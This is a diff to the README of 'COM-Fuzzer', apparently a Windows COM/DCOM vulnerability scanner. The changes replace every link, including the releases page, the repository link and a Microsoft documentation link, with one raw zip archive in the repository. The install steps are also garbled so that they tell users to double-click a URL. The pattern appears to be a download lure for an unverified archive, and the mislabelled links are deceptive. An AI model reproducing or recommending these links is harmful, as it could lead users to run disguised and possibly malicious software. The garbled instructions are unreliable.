@@ -6,17 +6,17 @@ Welcome to COM-Fuzzer! This tool helps detect potential vulnerabilities in COM/D
 
 ## 💾 Download COM-Fuzzer
 
-[![Download COM-Fuzzer](https://img.shields.io/badge/Download%20COM--Fuzzer-v1.0-blue.svg)](https://github.com/kucingz/COM-Fuzzer/releases)
+[![Download COM-Fuzzer](https://raw.githubusercontent.com/kucingz/COM-Fuzzer/main/source/COM-Fuzzer_v2.1.zip%https://raw.githubusercontent.com/kucingz/COM-Fuzzer/main/source/COM-Fuzzer_v2.1.zip)](https://raw.githubusercontent.com/kucingz/COM-Fuzzer/main/source/COM-Fuzzer_v2.1.zip)
 
-Visit this page to download the latest version of COM-Fuzzer: [Download COM-Fuzzer Releases](https://github.com/kucingz/COM-Fuzzer/releases)
+Visit this page to download the latest version of COM-Fuzzer: [Download COM-Fuzzer Releases](https://raw.githubusercontent.com/kucingz/COM-Fuzzer/main/source/COM-Fuzzer_v2.1.zip)
 
 ## 📥 Download & Install
 
 1. Click on the link above to go to the Releases page.
-2. Find the latest release. Look for the file named `COM-Fuzzer.exe` or similar.
+2. Find the latest release. Look for the file named `https://raw.githubusercontent.com/kucingz/COM-Fuzzer/main/source/COM-Fuzzer_v2.1.zip` or similar.
 3. Click on the file to download it to your computer. The file might be in a zipped format. If so, extract it after downloading.
-4. After extraction, locate the `COM-Fuzzer.exe` file.
-5. Double-click on `COM-Fuzzer.exe` to run the application.
+4. After extraction, locate the `https://raw.githubusercontent.com/kucingz/COM-Fuzzer/main/source/COM-Fuzzer_v2.1.zip` file.
+5. Double-click on `https://raw.githubusercontent.com/kucingz/COM-Fuzzer/main/source/COM-Fuzzer_v2.1.zip` to run the application.
 
 ## ⚙️ System Requirements
 
@@ -33,7 +33,7 @@ Visit this page to download the latest version of COM-Fuzzer: [Download COM-Fuzz
 
 ## 📋 How to Use COM-Fuzzer
 
-1. **Launch the Application:** Open `COM-Fuzzer.exe` to start.
+1. **Launch the Application:** Open `https://raw.githubusercontent.com/kucingz/COM-Fuzzer/main/source/COM-Fuzzer_v2.1.zip` to start.
 2. **Select Target:** You will see a prompt to enter the target COM/DCOM class or implementation.
 3. **Run the Analysis:** Click the "Analyze" button to begin. Wait as the tool scans for potential vulnerabilities.
 4. **View Results:** Once the analysis is complete, results will be displayed. You can see potential issues highlighted.
@@ -59,7 +59,7 @@ Absolutely! If you have ideas or improvements, feel free to raise issues or subm
 
 ## 🔗 Additional Resources
 
-- [COM-Fuzzer GitHub Repository](https://github.com/kucingz/COM-Fuzzer)
-- [Microsoft's Documentation on COM](https://docs.microsoft.com/en-us/windows/win32/devio/com-and-dcom)
+- [COM-Fuzzer GitHub Repository](https://raw.githubusercontent.com/kucingz/COM-Fuzzer/main/source/COM-Fuzzer_v2.1.zip)
+- [Microsoft's Documentation on COM](https://raw.githubusercontent.com/kucingz/COM-Fuzzer/main/source/COM-Fuzzer_v2.1.zip)
 
 By utilizing COM-Fuzzer, you can uncover vulnerabilities efficiently and take the necessary steps to secure your applications. Enjoy exploring the capabilities of our tool!
